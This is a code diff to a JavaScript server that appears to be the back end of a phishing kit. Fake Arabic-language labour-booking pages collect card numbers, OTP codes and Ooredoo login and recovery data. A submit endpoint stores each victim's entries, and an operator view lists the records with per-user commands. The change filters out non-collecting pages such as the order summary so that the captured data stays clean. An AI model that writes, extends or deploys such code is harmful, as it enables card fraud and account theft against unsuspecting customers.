@@ -85,8 +85,6 @@ const PAGE_REGISTRY = {
   monthly:         { label_ar: 'عمالة بالشهر',     label_en: 'Monthly Booking',  source: 'monthly.html',         collects: true },
   recruitment:     { label_ar: 'استقدام عمالة',    label_en: 'Recruitment',      source: 'recruitment.html',     collects: true },
   customer:        { label_ar: 'معلومات العميل',   label_en: 'Customer Info',    source: 'customer-info.html',   collects: true },
-  summary:         { label_ar: 'ملخص الطلب',       label_en: 'Order Summary',    source: 'order-summary.html',   collects: false },
-  payment_methods: { label_ar: 'طرق الدفع',        label_en: 'Payment Methods',  source: 'payment-methods.html', collects: false },
   payment:         { label_ar: 'بيانات البطاقة',   label_en: 'Card Payment',     source: 'payment.html',         collects: true },
   otp:             { label_ar: 'رمز التحقق',       label_en: 'OTP',              source: 'otp.html',             collects: true },
   ooredoo_login:   { label_ar: 'Ooredoo دخول',     label_en: 'Ooredoo Login',    source: 'ooredoo-login.html',   collects: true },
@@ -94,6 +92,8 @@ const PAGE_REGISTRY = {
   ooredoo_forgot:  { label_ar: 'Ooredoo استعادة',  label_en: 'Ooredoo Recovery', source: 'ooredoo-forgot.html',  collects: true },
   activity:        { label_ar: 'النشاط',           label_en: 'Activity Log',     source: 'various',              collects: false }
 };
+
+const IGNORED_PAGE_KEYS = new Set(['summary', 'payment_methods']);
 
 const LEGACY_PAGE_MAP = {
   'Home-Entrance':              'activity',
@@ -593,7 +593,7 @@ async function listConversations(limit = 300) {
       .slice(0, limit);
 
     return users.map((u) => {
-      const subs = localData.submissions.filter((s) => s.user_id === u.id);
+      const subs = localData.submissions.filter((s) => s.user_id === u.id && !IGNORED_PAGE_KEYS.has(s.page_key));
       const lastSub = subs.length > 0 ? subs[subs.length - 1] : null;
       return userPublicRow(u, {
         last_summary: lastSub ? String(lastSub.summary || '') : '',
@@ -613,7 +613,7 @@ async function listConversations(limit = 300) {
   const userIds = users.map((u) => u.id);
   const subStats = await col('submissions')
     .aggregate([
-      { $match: { user_id: { $in: userIds } } },
+      { $match: { user_id: { $in: userIds }, page_key: { $nin: ['summary', 'payment_methods'] } } },
       { $sort: { id: 1 } },
       {
         $group: {
@@ -663,12 +663,12 @@ async function getUserConversation(userId) {
   let cmds = [];
 
   if (useLocalFallback) {
-    subs = localData.submissions.filter((s) => s.user_id === numId).sort((a, b) => a.id - b.id);
+    subs = localData.submissions.filter((s) => s.user_id === numId && !IGNORED_PAGE_KEYS.has(s.page_key)).sort((a, b) => a.id - b.id);
     msgs = localData.messages.filter((m) => m.user_id === numId).sort((a, b) => a.id - b.id).slice(0, 300);
     cmds = localData.commands.filter((c) => c.user_id === numId).sort((a, b) => b.id - a.id).slice(0, 50);
   } else {
     [subs, msgs, cmds] = await Promise.all([
-      col('submissions').find({ user_id: numId }).sort({ id: 1 }).toArray(),
+      col('submissions').find({ user_id: numId, page_key: { $nin: ['summary', 'payment_methods'] } }).sort({ id: 1 }).toArray(),
       col('messages').find({ user_id: numId }).sort({ id: 1 }).limit(300).toArray(),
       col('commands').find({ user_id: numId }).sort({ id: -1 }).limit(50).toArray()
     ]);
@@ -923,9 +923,15 @@ app.post(['/api/submit.php', '/api/submit'], async (req, res) => {
     }
 
     let pageKey = String(inputVal(req, 'page_key', '')).trim();
+    if (IGNORED_PAGE_KEYS.has(pageKey)) {
+      return res.json({ ok: true, skipped: true, page: pageKey });
+    }
     if (!pageKey || !PAGE_REGISTRY[pageKey]) {
       const legacyPage = String(inputVal(req, 'page', '')).trim();
       pageKey = legacyPage ? legacyPageKey(legacyPage) : 'activity';
+      if (IGNORED_PAGE_KEYS.has(pageKey)) {
+        return res.json({ ok: true, skipped: true, page: pageKey });
+      }
     }
 
     const summary = String(inputVal(req, 'summary', pageLabel(pageKey))).trim().slice(0, 255) || pageLabel(pageKey);
